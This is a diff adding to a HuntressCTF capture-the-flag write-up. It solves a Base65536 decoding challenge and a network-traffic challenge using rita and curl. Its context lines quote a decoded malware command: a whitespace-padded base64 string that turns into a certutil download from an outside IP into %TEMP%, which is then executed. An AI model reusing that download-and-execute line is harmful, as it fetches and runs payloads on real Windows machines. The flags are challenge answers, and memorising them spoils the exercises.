@@ -458,3 +458,102 @@ Decoded the string starting with `ICAgICAg` and URL decoded it, got flag.
 root@kali:~/ctf/HuntressCTF# echo -ne 'ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNlcnR1dGlsIC11cmxjYWNoZSAtZiBodHRwOi8vLjEwMy4xNjMuMTg3LjEyOjgwODAvP2VuY29kZWRfZmxhZz0lNjYlNmMlNjElNjclN2IlNjQlNjIlNjYlNjUlMzUlNjYlMzclMzUlMzUlNjElMzglMzklMzglNjMlNjUlMzUlNjYlMzIlMzAlMzglMzglNjIlMzAlMzglMzklMzIlMzglMzUlMzAlNjIlNjYlMzclN2QgJVRFTVAlXGYgJiBzdGFydCAvQiAlVEVNUCVcZg==' | base64 -d | python3 -c "import sys; from urllib.parse import unquote; print(unquote(sys.stdin.read()));"
 (snip)  certutil -urlcache -f http://.103.163.187.12:8080/?encoded_flag=flag{dbfe5f755a898ce5f2088b0892850bf7} %TEMP%\f & start /B %TEMP%\f
 ```
+
+## BaseFFFF+1
+
+### Description
+
+> Maybe you already know about base64, but what if we took it up a notch?
+>
+> Download the files below.
+>
+> Attachments: baseffff1
+
+### Flag
+
+flag{716abce880f09b7cdc7938eddf273648}
+
+### Solution
+
+```console
+root@kali:~/ctf/HuntressCTF# file baseffff1
+baseffff1: Unicode text, UTF-8 text, with no line terminators
+
+root@kali:~/ctf/HuntressCTF# cat baseffff1
+鹎驣𔔠𓁯噫谠啥鹭鵧啴陨驶𒄠陬驹啤鹷鵴𓈠𒁯ꔠ𐙡啹院驳啳驨驲挮售𖠰筆筆鸠啳樶栵愵欠樵樳昫鸠啳樶栵嘶谠ꍥ啬𐙡𔕹𖥡唬驨驲鸠啳𒁹𓁵鬠陬潧㸍㸍ꍦ鱡汻欱靡驣洸鬰渰汢饣汣根騸饤杦样椶𠌸
+```
+
+This challenge name is `BaseFFFF+1` (=65535+1) and I guess this text is Base65536 encoded.
+Using [this tool](https://www.better-converter.com/Encoders-Decoders/Base65536-Decode), got flag.
+
+output:
+
+```text
+Nice work! We might have played with too many bases here... 0xFFFF is 65535, 65535+1 is 65536! Well anyway, here is your flag:
+
+flag{716abce880f09b7cdc7938eddf273648}
+```
+
+## Traffic
+
+### Description
+
+> We saw some communication to a sketchy site... here's an export of the network traffic. Can you track it down?
+>
+> Some tools like rita or zeek might help dig through all of this data!
+>
+> Download the file below.
+> Attachments: traffic.7z
+
+### Flag
+
+flag{8626fe7dcd8d412a80d0b3f0e36afd4a}
+
+### Solution
+
+Setup [rita](https://github.com/activecm/rita) in Kali:
+
+```bash
+# extract traffic.7z to logs directory
+7z -ologs e traffic.7z
+
+docker run --rm --name rita-mongo -p 27017:27017 -d mongo:4.2
+
+# https://github.com/activecm/rita/blob/master/docs/Manual%20Installation.md
+git clone https://github.com/activecm/rita.git && cd rita
+make
+
+sudo mkdir /etc/rita && sudo chmod 755 /etc/rita
+sudo mkdir -p /var/lib/rita/logs && sudo chmod -R 755 /var/lib/rita
+sudo chmod 777 /var/lib/rita/logs
+
+sudo cp etc/rita.yaml /etc/rita/config.yaml && sudo chmod 666 /etc/rita/config.yaml
+```
+
+Import logs and show long connection IP address and access its URL.
+Got flag.
+
+```console
+root@kali:~/ctf/HuntressCTF/rita# ./rita import ../logs test
+
+        [+] Importing [../logs]:
+        [-] Verifying log files have not been previously parsed into the target dataset ...
+        [-] Processing batch 1 of 1
+        [-] Parsing logs to: test ...
+(snip)
+        [-] Done!
+
+
+root@kali:~/ctf/HuntressCTF/rita# ./rita show-long-connections test
+Source IP,Destination IP,Port:Protocol:Service,Total Duration,Longest Duration,Connections,Total Bytes,State
+10.24.0.2,185.199.108.153,443:tcp:- 443:tcp:ssl,5496.54,404.006,52,249194,closed
+(snip)
+
+root@kali:~/ctf/HuntressCTF/rita# ./rita show-ip-dns-fqdns test 185.199.108.153
+Queried FQDN
+sketchysite.github.io
+
+root@kali:~/ctf/HuntressCTF/rita# curl -s https://sketchysite.github.io | html2text
+****** sketchysite.github.io ******
+flag{8626fe7dcd8d412a80d0b3f0e36afd4a}
+```
